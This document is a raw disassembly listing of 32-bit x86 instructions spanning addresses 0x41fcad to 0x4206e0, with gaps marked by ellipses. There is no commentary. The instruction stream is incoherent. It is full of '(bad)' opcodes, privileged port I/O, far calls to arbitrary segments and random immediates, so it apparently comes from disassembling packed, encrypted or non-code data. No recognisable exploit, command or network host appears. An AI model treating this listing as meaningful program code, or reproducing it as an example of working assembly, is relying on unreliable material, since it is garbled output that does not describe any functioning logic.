  41fcad:	es adc eax,0x669902bb
  41fcb3:	div    DWORD PTR [edx+0x5ae11a2d]
  41fcb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcba:	add    eax,0x80cba632
  41fcbf:	repnz or al,0xef
  41fcc2:	scas   al,BYTE PTR es:[edi]
  41fcc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc4:	in     eax,0x2c
  41fcc6:	repnz retf 0x7288
  41fcca:	xor    BYTE PTR [edi],cl
  41fccc:	sub    ecx,DWORD PTR [eax+0x6c]
  41fccf:	sub    eax,0x82487021
  41fcd4:	sbb    dl,al
  41fcd6:	push   edi
  41fcd7:	xchg   edi,eax
  41fcd8:	mov    edi,0x1461d330
  41fcdd:	mov    ebp,0x81ec9bc4
  41fce2:	sahf   
  41fce3:	xchg   ecx,eax
  41fce4:	pop    ebx
  41fce5:	inc    edx
  41fce6:	sar    BYTE PTR ds:0xf2b66d2c,cl
  41fcec:	daa    
  41fced:	call   0xfc78:0x3352f8e1
  41fcf4:	daa    
  41fcf5:	push   cs
  41fcf6:	jns    0x41fccf
  41fcf8:	mov    cl,0x1c
  41fcfa:	repz adc al,BYTE PTR ds:0x161ff5bd
  41fd01:	(bad)  
  41fd02:	pop    ds
  41fd03:	test   DWORD PTR [ebx],eax
  41fd05:	adc    eax,0x84dff477
  41fd0a:	inc    ebp
  41fd0b:	or     BYTE PTR ds:0x760e88,bh
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	pop    esp
  41fd81:	push   eax
  41fd82:	jp     0x41fd7f
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	out    dx,eax
  41fd8d:	inc    eax
  41fd8e:	mov    ecx,0x578f918a
  41fd93:	add    al,0x0
  41fd95:	xor    esp,DWORD PTR [ebx]
  41fd97:	or     DWORD PTR [ecx+eiz*4],esp
  41fd9a:	pop    edi
  41fd9b:	sar    edx,cl
  41fd9d:	imul   ebp,ebp,0x7edd7e24
  41fda3:	cmp    eax,0x623ade9a
  41fda8:	pop    ebx
  41fda9:	pop    ss
  41fdaa:	aad    0x96
  41fdac:	or     eax,0x58c4a385
  41fdb1:	xchg   ecx,eax
  41fdb2:	loop   0x41fd4e
  41fdb4:	sub    eax,0xa51d63dc
  41fdb9:	mul    DWORD PTR [ecx-0xf503df9]
  41fdbf:	sub    DWORD PTR [edx-0x6818c1e0],ecx
  41fdc5:	call   0x9428fb4
  41fdca:	lahf   
  41fdcb:	loope  0x41fd84
  41fdcd:	mov    edx,esp
  41fdcf:	cmp    edx,eax
  41fdd1:	jmp    0x9df5a45e
  41fdd6:	iret   
  41fdd7:	jl     0x41fdb7
  41fdd9:	and    ebp,DWORD PTR [esp+ebp*1+0x24]
  41fddd:	add    DWORD PTR [ebp-0x6b1be3ca],ebp
  41fde3:	mov    esp,0xa592818
  41fde8:	push   es
  41fde9:	and    bh,BYTE PTR [esi+0x12]
  41fdec:	call   0x8e9aea15
  41fdf1:	add    BYTE PTR [edx+0x3b8f3887],dh
  41fdf7:	and    edx,DWORD PTR [edi]
  41fdf9:	push   ebp
  41fdfa:	sbb    cl,BYTE PTR [ebx+0x24]
  41fdfd:	shl    BYTE PTR [ebx+0x31f18892],1
  41fe03:	push   ss
  41fe04:	mov    al,ds:0x756cb9f2
  41fe09:	sub    BYTE PTR [eax+0x3e],dl
  41fe0c:	pop    eax
  41fe0d:	je     0x41fe27
  41fe0f:	mov    ecx,0xd70509b9
  41fe14:	ins    BYTE PTR es:[edi],dx
  41fe15:	jnp    0x41fe42
  41fe17:	fxch   st(6)
  41fe19:	sub    esi,edx
  41fe1b:	cmc    
  41fe1c:	sub    al,0x7f
  41fe1e:	sbb    ebx,DWORD PTR [ecx]
  41fe20:	add    eax,0x833ad3bd
  41fe25:	dec    edx
  41fe26:	or     BYTE PTR [ecx],0xaf
  41fe29:	outs   dx,BYTE PTR ds:[esi]
  41fe2a:	shl    cl,1
  41fe2c:	cwde   
  41fe2d:	iret   
  41fe2e:	(bad)  
  41fe2f:	es pop eax
  41fe31:	cld    
  41fe32:	inc    edx
  41fe33:	mov    WORD PTR [edi-0x794fbbfd],fs
  41fe39:	sbb    al,0xbc
  41fe3b:	aad    0x4a
  41fe3d:	pusha  
  41fe3e:	das    
  41fe3f:	and    DWORD PTR [ebp+0x388ce227],edi
  41fe45:	inc    ebx
  41fe46:	fisub  DWORD PTR [ebp+0x259fd4cc]
  41fe4c:	inc    edx
  41fe4d:	pop    edi
  41fe4e:	add    DWORD PTR [edx+0x42],ecx
  41fe51:	mov    cl,0xb8
  41fe53:	push   edi
  41fe54:	xchg   edi,eax
  41fe55:	push   es
  41fe56:	add    ebx,DWORD PTR [ebx]
  41fe58:	jb     0x41fdde
  41fe5a:	inc    edi
  41fe5b:	out    0x2a,eax
  41fe5d:	lahf   
  41fe5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe60:	sub    DWORD PTR [eax+eax*2-0x68],esp
  41fe64:	adc    eax,0x8bac8121
  41fe69:	xor    al,0xe3
  41fe6b:	and    cl,al
  41fe6d:	aaa    
  41fe6e:	push   ecx
  41fe6f:	dec    ebx
  41fe70:	add    al,0x47
  41fe72:	add    cl,dh
  41fe74:	mov    BYTE PTR [edx+0x6d1e0d1f],al
  41fe7a:	mov    bh,0xbc
  41fe7c:	arpl   WORD PTR [edi+ebp*8+0x4f],ax
  41fe80:	add    DWORD PTR [ebx],ebx
  41fe82:	fistp  QWORD PTR [ebx-0x38cabab0]
  41fe88:	mov    esp,0x7e398e9a
  41fe8d:	pop    edi
  41fe8e:	js     0x41fe3f
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x45
  41ff01:	loope  0x41ff29
  41ff03:	mov    edi,0x153dc
  41ff08:	add    al,0x1
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	lea    edx,[eax-0x18cb78b5]
  41ff12:	es sub dl,dl
  41ff15:	xor    BYTE PTR [ebp+0x164d8a24],0x35
  41ff1c:	(bad)  
  41ff1e:	enter  0xcfd4,0x81
  41ff22:	push   ebp
  41ff23:	aam    0x53
  41ff25:	push   esi
  41ff26:	enter  0xc6d0,0x22
  41ff2a:	xchg   esi,eax
  41ff2b:	mov    eax,0x55bd0401
  41ff30:	xor    dl,BYTE PTR [esi-0x3967f2c9]
  41ff36:	adc    DWORD PTR [ebx-0x6a],ebp
  41ff39:	and    DWORD PTR [edx-0x8],ebp
  41ff3c:	mov    cl,0xdf
  41ff3e:	xchg   ecx,eax
  41ff3f:	xchg   edx,eax
  41ff40:	adc    eax,0x30509c32
  41ff45:	sbb    BYTE PTR [ebx+eiz*8],0xe0
  41ff49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff4a:	rcr    DWORD PTR [ecx+eax*8],cl
  41ff4d:	sbb    bh,bl
  41ff4f:	jne    0x41ffc7
  41ff51:	mov    ds:0x5fe8e980,eax
  41ff56:	jb     0x41ff86
  41ff58:	aam    0x4b
  41ff5a:	cmp    DWORD PTR [edi],esp
  41ff5c:	mov    esp,0x585803ff
  41ff61:	sbb    eax,0xcc175c1c
  41ff66:	arpl   bx,ax
  41ff68:	or     edx,DWORD PTR [ecx+ecx*1]
  41ff6b:	cmc    
  41ff6c:	and    eax,0xfcbdaf2c
  41ff71:	push   es
  41ff72:	stc    
  41ff73:	int3   
  41ff74:	int3   
  41ff75:	es fs add ebp,0xb320f0ab
  41ff7d:	jge    0x41fffe
  41ff7f:	mov    esi,0xa929e4c2
  41ff84:	pop    eax
  41ff85:	mov    ds:0xe02e3afc,eax
  41ff8a:	loope  0x41ff5c
  41ff8c:	std    
  41ff8d:	dec    ebx
  41ff8e:	fwait
  41ff8f:	es push ds
  41ff91:	pop    esi
  41ff92:	and    ebx,ecx
  41ff94:	popa   
  41ff95:	and    cl,dh
  41ff97:	ss dec edi
  41ff99:	jae    0x41ff96
  41ff9b:	mov    ch,0x39
  41ff9d:	in     al,dx
  41ff9e:	jge    0x41ff22
  41ffa0:	lock pop es
  41ffa2:	in     eax,dx
  41ffa3:	pop    esp
  41ffa4:	mov    dh,dh
  41ffa6:	in     eax,0xd8
  41ffa8:	out    0x24,al
  41ffaa:	adc    eax,0xd80362bd
  41ffaf:	stos   BYTE PTR es:[edi],al
  41ffb0:	and    DWORD PTR [esi+0xe],0xe54b31f5
  41ffb7:	pop    ecx
  41ffb8:	in     al,dx
  41ffb9:	or     al,0xac
  41ffbb:	sbb    bl,al
  41ffbd:	push   esi
  41ffbe:	ret    
  41ffbf:	and    al,BYTE PTR [edi+eax*1]
  41ffc2:	outs   dx,DWORD PTR ds:[esi]
  41ffc3:	bound  ebx,QWORD PTR [esi-0x36]
  41ffc6:	mov    cs,esp
  41ffc8:	pop    edi
  41ffc9:	jg     0x41ff83
  41ffcb:	js     0x420009
  41ffcd:	dec    edi
  41ffce:	gs pop edi
  41ffd0:	or     BYTE PTR [ebp+0x73f6590],0x52
  41ffd7:	(bad)  
  41ffd8:	(bad)  [edi]
  41ffda:	or     eax,0x2c891038
  41ffdf:	dec    ebx
  41ffe0:	add    cl,BYTE PTR [esi+ebp*8-0x36c885be]
  41ffe7:	pop    edi
  41ffe8:	ficomp DWORD PTR [edi+0x2cb9334b]
  41ffee:	xor    eax,0xbb222697
  41fff3:	xchg   ebx,eax
  41fff4:	xor    ebp,ebx
  41fff6:	push   es
  41fff7:	ficom  DWORD PTR [ecx-0x7e09e563]
  41fffd:	ret    
  41fffe:	popa   
  41ffff:	xlat   BYTE PTR ds:[ebx]
  420000:	loope  0x41ff85
  420002:	div    BYTE PTR [ebx]
  420004:	inc    ecx
  420005:	repz inc esi
  420007:	outs   dx,DWORD PTR ds:[esi]
  420008:	mov    edi,0xd80da22c
  42000d:	mov    eax,0xc59a
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff99
  420081:	xchg   ebp,eax
  420082:	and    DWORD PTR [edx-0x20],edx
  420085:	push   esp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008d:	and    eax,0x76af973a
  420092:	ins    DWORD PTR es:[edi],dx
  420093:	xchg   DWORD PTR [eax-0x21d725bf],ebp
  420099:	push   es
  42009a:	dec    ebp
  42009b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42009c:	inc    esi
  42009d:	retf   
  42009e:	xor    BYTE PTR [ebx+ebp*2],ch
  4200a1:	cld    
  4200a2:	lea    esp,[ebx+0x65]
  4200a5:	(bad)  
  4200a6:	nop
  4200a7:	sar    dl,1
  4200a9:	in     al,dx
  4200aa:	cld    
  4200ab:	outs   dx,DWORD PTR ds:[esi]
  4200ac:	out    dx,al
  4200ad:	mov    edi,0x4c7e2182
  4200b2:	or     ebx,edi
  4200b4:	stos   BYTE PTR es:[edi],al
  4200b5:	mov    BYTE PTR [ecx],bh
  4200b7:	nop
  4200b8:	div    BYTE PTR [bp-0x2689]
  4200bd:	enter  0x712c,0x1d
  4200c1:	cs jo  0x420142
  4200c4:	jle    0x4200d9
  4200c6:	pusha  
  4200c7:	ret    0x2ca5
  4200ca:	sbb    al,0x6a
  4200cc:	pop    edi
  4200cd:	std    
  4200ce:	sar    DWORD PTR ss:[ebp-0x63],0xe
  4200d3:	mov    eax,ds:0xfad5b0de
  4200d8:	mov    cl,0xa6
  4200da:	int    0xac
  4200dc:	xchg   BYTE PTR [ebp+0x0],ah
  4200df:	sahf   
  4200e0:	cmc    
  4200e1:	mov    edi,0x6a034c5f
  4200e6:	rcl    ch,cl
  4200e8:	popf   
  4200e9:	retf   0x94f2
  4200ec:	jg     0x420082
  4200ee:	xor    ax,0x8cfc
  4200f2:	arpl   WORD PTR [ebp-0x610009bb],cx
  4200f8:	jne    0x420105
  4200fa:	jbe    0x4200c4
  4200fc:	hlt    
  4200fd:	js     0x420109
  4200ff:	ss xchg edi,eax
  420101:	test   esi,edx
  420103:	outs   dx,DWORD PTR ds:[esi]
  420104:	jmp    0x12f35275
  420109:	xchg   ecx,eax
  42010a:	addr16 pop eax
  42010c:	pop    eax
  42010d:	cmp    cl,ah
  42010f:	int    0xcf
  420111:	inc    eax
  420112:	and    al,0xe3
  420114:	push   ebx
  420115:	mov    WORD PTR [ebx-0x2a11c013],?
  42011b:	cs ja  0x420187
  42011e:	ins    DWORD PTR es:[edi],dx
  42011f:	pop    ebx
  420120:	ret    0xe102
  420123:	push   eax
  420124:	ret    0x95ea
  420127:	loop   0x4200aa
  420129:	pop    ds
  42012a:	jecxz  0x42018f
  42012c:	xchg   ecx,eax
  42012d:	test   DWORD PTR [esi],eax
  42012f:	call   0xe145:0x6a5fa0d0
  420136:	xchg   ebx,eax
  420137:	adc    edx,DWORD PTR [ebp+edx*2-0x5ec4064f]
  42013e:	aaa    
  42013f:	imul   ebx,ebx,0x1c
  420142:	sub    BYTE PTR [esi-0x149316e9],dh
  420148:	and    bh,0x48
  42014b:	adc    al,0xd6
  42014d:	xor    BYTE PTR [esi+0x70],ah
  420150:	jns    0x420143
  420152:	and    esp,DWORD PTR [ebx-0x8]
  420155:	jne    0x42017a
  420157:	jmp    0x420138
  420159:	into   
  42015a:	aam    0x81
  42015c:	cmp    DWORD PTR [esi+eiz*2+0x55],ebx
  420160:	cs and al,0x40
  420163:	out    dx,eax
  420164:	(bad)
  420168:	scas   eax,DWORD PTR es:[edi]
  420169:	or     al,BYTE PTR fs:[ebx]
  42016c:	pop    ebp
  42016d:	cmp    al,0x97
  42016f:	cmp    dl,BYTE PTR [ebp-0x17]
  420172:	leave  
  420173:	mov    edx,0x6cb1240c
  420178:	pop    es
  420179:	jge    0x42016a
  42017b:	cmp    BYTE PTR [ebx-0x59],ch
  42017e:	inc    eax
  42017f:	aas    
  420180:	push   ebx
  420181:	cdq    
  420182:	pushf  
  420183:	lock int3 
  420185:	fwait
  420186:	jg     0x420128
  420188:	fiadd  DWORD PTR [edx]
  42018a:	xchg   DWORD PTR ds:0xab1439e1,esp
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x23af3769],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	jae    0x420192
  42020e:	xchg   BYTE PTR [ebp-0x4e],dh
  420211:	jns    0x42025f
  420213:	mov    DWORD PTR [ebp+0x10993b0],edx
  420219:	dec    ebp
  42021a:	push   eax
  42021b:	push   ebx
  42021c:	or     al,0xc7
  42021e:	push   cs
  42021f:	popa   
  420220:	cli    
  420221:	int3   
  420222:	dec    esp
  420223:	and    esp,DWORD PTR [esi+0x52ea571c]
  420229:	inc    esi
  42022a:	adc    ebp,DWORD PTR cs:[esi]
  42022d:	fild   DWORD PTR [edi-0x3fedf58f]
  420233:	mov    dh,0xe1
  420235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420236:	call   0x49bfe0e6
  42023b:	test   bh,cl
  42023d:	imul   edx,DWORD PTR ss:[esp+eiz*2+0x4a],0xdc0e595d
  420246:	add    ebp,ebx
  420248:	shl    DWORD PTR [edx-0x2c],cl
  42024b:	pop    ds
  42024c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42024d:	aas    
  42024e:	stc    
  42024f:	and    DWORD PTR [esi-0x41],0x75
  420253:	imul   ebx,DWORD PTR [ebx-0x72],0x15
  420257:	(bad)
  42025a:	icebp  
  42025b:	in     eax,dx
  42025c:	inc    esi
  42025d:	mov    ds:0xedc18137,eax
  420262:	cld    
  420263:	es add eax,0xec7f772e
  420269:	loopne 0x420231
  42026b:	gs mov dh,ch
  42026e:	xor    ebp,DWORD PTR [ebx-0x3c91b3dd]
  420274:	mov    DWORD PTR [ecx],ebx
  420276:	in     eax,0x58
  420278:	addr16 cmp al,0xab
  42027b:	fsub   st,st(0)
  42027d:	pop    ebx
  42027e:	xchg   ch,ah
  420280:	les    edx,FWORD PTR [esi]
  420282:	mov    esp,0x1e45e49a
  420287:	inc    esi
  420288:	fild   DWORD PTR [esi]
  42028a:	inc    esp
  42028b:	in     eax,0x8f
  42028d:	push   es
  42028e:	les    esi,FWORD PTR [ecx-0x17]
  420291:	jbe    0x42029b
  420293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420294:	aad    0xac
  420296:	icebp  
  420297:	dec    ecx
  420298:	js     0x4202ce
  42029a:	inc    edi
  42029b:	enter  0xf32,0xba
  42029f:	and    DWORD PTR [esi+eax*2-0x60],edi
  4202a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202a4:	je     0x42030c
  4202a6:	stos   DWORD PTR es:[edi],eax
  4202a7:	call   0x5a9f01dc
  4202ac:	push   ebp
  4202ad:	sti    
  4202ae:	push   esp
  4202af:	mov    DWORD PTR [ebp+0x3d],0xd666b989
  4202b6:	dec    ecx
  4202b7:	jge    0x420257
  4202b9:	xlat   BYTE PTR ds:[ebx]
  4202ba:	xor    dh,BYTE PTR [esi+0x1a]
  4202bd:	dec    BYTE PTR [esi+0x71]
  4202c0:	pop    esp
  4202c1:	push   ss
  4202c2:	add    ch,BYTE PTR [ecx]
  4202c4:	mov    eax,0x457e6ec9
  4202c9:	int3   
  4202ca:	lods   al,BYTE PTR ds:[esi]
  4202cb:	mov    DWORD PTR [ebx-0x2d144572],ebp
  4202d1:	hlt    
  4202d2:	lods   al,BYTE PTR ds:[esi]
  4202d3:	iret   
  4202d4:	out    0x29,al
  4202d6:	or     DWORD PTR [ecx],eax
  4202d8:	jnp    0x420338
  4202da:	test   BYTE PTR [eax-0x38],al
  4202dd:	add    eax,esp
  4202df:	xor    ebp,DWORD PTR [ebx]
  4202e1:	mov    esp,0x89c1103d
  4202e6:	lock (bad) [eax]
  4202e9:	inc    esi
  4202ea:	and    BYTE PTR ds:0x212e195b,dh
  4202f0:	mov    eax,0x6035500a
  4202f5:	test   ecx,ecx
  4202f7:	lods   al,BYTE PTR ds:[esi]
  4202f8:	aaa    
  4202f9:	retf   0xc5d6
  4202fc:	pop    ebx
  4202fd:	xor    esi,DWORD PTR [ecx+edi*1+0x275886a4]
  420304:	add    cl,BYTE PTR [ecx]
  420306:	out    dx,eax
  420307:	fiadd  WORD PTR [eax+ebp*4+0x3f74577b]
  42030e:	sub    dh,BYTE PTR [ecx]
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420381:	test   eax,0x56e8820c
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	mov    al,ds:0xf031296e
  420391:	inc    eax
  420392:	pusha  
  420393:	mov    WORD PTR [ecx-0x42],gs
  420396:	sar    esi,1
  420398:	into   
  420399:	adc    esi,DWORD PTR [eax]
  42039b:	adc    DWORD PTR [ecx+0x74],edx
  42039e:	hlt    
  42039f:	aad    0xf5
  4203a1:	jmpw   0xdab3
  4203a5:	call   FWORD PTR [esi]
  4203a7:	sbb    eax,edi
  4203a9:	popf   
  4203aa:	and    BYTE PTR [ebp+0x388ef18b],cl
  4203b0:	in     al,0xc4
  4203b2:	pop    edi
  4203b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b4:	call   FWORD PTR [ebp+0x40b840d3]
  4203ba:	hlt    
  4203bb:	in     al,dx
  4203bc:	inc    bl
  4203be:	lods   eax,DWORD PTR ds:[esi]
  4203bf:	ds mov ecx,0xa49e23c7
  4203c5:	adc    al,0x16
  4203c7:	sub    dh,al
  4203c9:	(bad)  
  4203ca:	mov    eax,0xb60e87b9
  4203cf:	(bad)  
  4203d0:	js     0x420426
  4203d2:	leave  
  4203d3:	push   esp
  4203d4:	xchg   BYTE PTR [esp+ebx*1+0x1e592ccf],bh
  4203db:	loope  0x4203d8
  4203dd:	adc    BYTE PTR [ebp+ecx*2-0x52547b63],al
  4203e4:	sub    DWORD PTR [edx],0x5b
  4203e7:	jno    0x4203a6
  4203e9:	popa   
  4203ea:	out    0x59,al
  4203ec:	fsubr  DWORD PTR [edi-0x58c01685]
  4203f2:	mov    esi,0xfa575a92
  4203f7:	sbb    ch,BYTE PTR [eax+0x276818fe]
  4203fd:	je     0x420465
  4203ff:	sub    ebp,DWORD PTR [esi+0x301d4ba3]
  420405:	adc    bl,cl
  420407:	inc    edx
  420408:	dec    esi
  420409:	jle    0x42040c
  42040b:	xor    edi,eax
  42040d:	mov    esp,0xfe1d053f
  420412:	push   ebx
  420413:	xor    ecx,DWORD PTR [edx+0x4ce7eae1]
  420419:	add    al,0x39
  42041b:	jns    0x420444
  42041d:	ds inc edx
  42041f:	repz ficom WORD PTR [edx]
  420422:	xor    ebp,DWORD PTR [ebp-0x1a]
  420425:	pop    ss
  420426:	aad    0xe0
  420428:	ins    BYTE PTR es:[edi],dx
  420429:	aad    0xc5
  42042b:	inc    ebx
  42042c:	sub    BYTE PTR [esi],ah
  42042e:	mov    dl,0x95
  420430:	inc    edi
  420431:	popf   
  420432:	xchg   edi,eax
  420433:	scas   eax,DWORD PTR es:[edi]
  420434:	repnz das 
  420436:	cmp    BYTE PTR [esi],al
  420438:	jbe    0x4203bb
  42043a:	sbb    DWORD PTR [esp+edi*2-0x274e024],ebp
  420441:	mov    esp,0x7bbee54f
  420446:	mov    al,ds:0x3ee61bcc
  42044b:	adc    al,0x61
  42044d:	pop    es
  42044e:	jbe    0x420486
  420450:	mov    bl,0x52
  420452:	jbe    0x4204ca
  420454:	lahf   
  420455:	jecxz  0x420499
  420457:	sub    cl,bh
  420459:	jl     0x4203df
  42045b:	retf   
  42045c:	xchg   ebx,eax
  42045d:	ss jae 0x4203e7
  420460:	out    dx,eax
  420461:	(bad)  
  420462:	hlt    
  420463:	cld    
  420464:	iret   
  420465:	and    eax,0x487acb
  42046a:	(bad)  
  42046b:	xchg   edx,eax
  42046c:	(bad)  
  42046d:	daa    
  42046e:	in     eax,0x1d
  420470:	dec    ebp
  420471:	xacquire xchg DWORD PTR [edi],esp
  420474:	add    BYTE PTR [esp+eiz*8+0x52],cl
  420478:	or     al,0xaa
  42047a:	pop    ebx
  42047b:	xor    edx,0xcc31f50e
  420481:	xor    BYTE PTR [edi+0x2ff353d],ch
  420487:	call   0xb5908ea6
  42048c:	jae    0x42041d
  42048e:	enter  0xd2,0x0
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	mov    cl,0x20
  420502:	and    bh,BYTE PTR [ebp+0x157ec]
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	repnz adc esp,DWORD PTR [edx+eax*4+0x10]
  420511:	jmp    0x42f5:0x46e14b63
  420518:	push   esp
  420519:	imul   BYTE PTR [ebx+ecx*1]
  42051c:	sbb    dl,dh
  42051e:	shl    ch,1
  420520:	xlat   BYTE PTR ds:[ebx]
  420521:	pop    edx
  420522:	enter  0x701d,0x7c
  420526:	lea    ebx,ds:0x25b64103
  42052c:	xchg   edx,ebx
  42052e:	fsubr  DWORD PTR [ecx]
  420530:	into   
  420531:	xor    bh,BYTE PTR [ebx]
  420533:	in     eax,0x5
  420535:	sbb    al,0x32
  420537:	adc    eax,DWORD PTR [ebx-0x28]
  42053a:	dec    eax
  42053b:	(bad)  
  42053c:	cli    
  42053d:	jno    0x4204ed
  42053f:	mov    bl,0x3c
  420541:	nop
  420542:	adc    eax,0xcbd76f8b
  420547:	adc    bh,BYTE PTR [ecx-0x5d]
  42054a:	cwde   
  42054b:	outs   dx,DWORD PTR ds:[esi]
  42054c:	in     eax,0x42
  42054e:	stos   DWORD PTR es:[edi],eax
  42054f:	lock int3 
  420551:	call   0x91457a40
  420556:	scas   eax,DWORD PTR es:[edi]
  420557:	cli    
  420558:	scas   al,BYTE PTR es:[edi]
  420559:	jne    0x420569
  42055b:	push   ds
  42055c:	cmp    bh,BYTE PTR [ecx+0x5857c3a0]
  420562:	fdivr  QWORD PTR [eax+eax*4+0x10]
  420566:	sbb    DWORD PTR [edx],esi
  420568:	mov    bl,0xdb
  42056a:	and    DWORD PTR [edi-0x449808f4],esp
  420570:	jl     0x4205a4
  420572:	pop    es
  420573:	dec    ebp
  420574:	xor    eax,0x2b139d7
  420579:	sub    edi,DWORD PTR [esi]
  42057b:	jb     0x4205c8
  42057d:	jno    0x4205a6
  42057f:	mov    cs,edx
  420581:	outs   dx,DWORD PTR ds:[esi]
  420582:	outs   dx,BYTE PTR ds:[esi]
  420583:	push   edi
  420584:	js     0x42057d
  420586:	add    DWORD PTR [eax+0x7b28bd9c],ecx
  42058c:	lods   eax,DWORD PTR ds:[esi]
  42058d:	fs loopne 0x420545
  420590:	push   ecx
  420591:	mov    BYTE PTR [edx],bh
  420593:	aam    0x97
  420595:	in     al,dx
  420596:	(bad)  
  420597:	rcr    edi,1
  420599:	ds adc bl,dl
  42059c:	sub    eax,0xc52b72bb
  4205a1:	call   0xb57c:0x11cdd4b5
  4205a8:	lock ds xchg ebp,eax
  4205ab:	or     ch,BYTE PTR [ebp+0x7c5f7b2c]
  4205b1:	iret   
  4205b2:	ss sub al,0x5e
  4205b5:	cmc    
  4205b6:	aas    
  4205b7:	xor    cl,dh
  4205b9:	push   ebp
  4205ba:	test   DWORD PTR [esi],0x9e63abdc
  4205c0:	stc    
  4205c1:	dec    esp
  4205c2:	pusha  
  4205c3:	mov    eax,0xbeba49f
  4205c8:	js     0x42058b
  4205ca:	push   esi
  4205cb:	popa   
  4205cc:	push   eax
  4205cd:	cmp    eax,DWORD PTR [ecx]
  4205cf:	lods   eax,DWORD PTR ds:[esi]
  4205d0:	lods   eax,DWORD PTR ds:[esi]
  4205d1:	scas   al,BYTE PTR es:[edi]
  4205d2:	je     0x4205d2
  4205d4:	loopne 0x4205cd
  4205d6:	dec    edi
  4205d7:	and    ebp,DWORD PTR [edi+0x21f97993]
  4205dd:	ins    BYTE PTR es:[edi],dx
  4205de:	hlt    
  4205df:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4205e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e2:	push   eax
  4205e3:	push   eax
  4205e4:	retf   
  4205e5:	ficom  DWORD PTR [esi-0x38]
  4205e8:	daa    
  4205e9:	icebp  
  4205ea:	mov    bl,0x46
  4205ec:	mov    dl,0x71
  4205ee:	push   ss
  4205ef:	add    esp,DWORD PTR [edx-0x68]
  4205f2:	inc    edi
  4205f3:	ins    BYTE PTR es:[edi],dx
  4205f4:	mov    eax,0x6ab047f7
  4205f9:	jnp    0x4205de
  4205fb:	js     0x4205dd
  4205fd:	(bad)  
  4205ff:	fnstenv [esi]
  420601:	addr16 aas 
  420603:	es push ebp
  420605:	sub    eax,0x3bfcd703
  42060a:	xchg   DWORD PTR [ebx],eax
  42060c:	aam    0x3
  42060e:	out    0xb2,eax
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	or     ebx,ecx
  420682:	lea    eax,[ebx]
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	dec    eax
  42068d:	jl     0x420667
  42068f:	(bad)  
  420691:	xor    edi,esp
  420693:	dec    ecx
  420694:	jmp    0xf285cd6f
  420699:	push   ds
  42069a:	ins    DWORD PTR es:[edi],dx
  42069b:	xabort 0xf3
  42069e:	hlt    
  42069f:	pusha  
  4206a0:	mov    ds:0xf675c652,eax
  4206a5:	or     eax,0x3b662f5d
  4206aa:	ins    BYTE PTR es:[edi],dx
  4206ab:	jmp    0x9f98:0x7aad4056
  4206b2:	nop    DWORD PTR cs:[ebx+0x11d68249]
  4206ba:	mov    dh,0x28
  4206bc:	add    edx,DWORD PTR [ecx+0x1f4232bc]
  4206c2:	mov    dl,BYTE PTR [ebp-0x7f]
  4206c5:	loope  0x42073a
  4206c7:	aaa    
  4206c8:	in     eax,dx
  4206c9:	mov    ah,0x71
  4206cb:	fstp   DWORD PTR [edi-0x40]
  4206ce:	dec    ebp
  4206cf:	clc    
  4206d0:	mov    ebx,fs
  4206d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206d3:	pop    ebx
  4206d4:	and    DWORD PTR [edx-0x35],ebp
  4206d7:	cmp    ah,bl
  4206d9:	pop    ss
  4206da:	sub    BYTE PTR [ebx+0x199ff86],al
  4206e0:	int3   
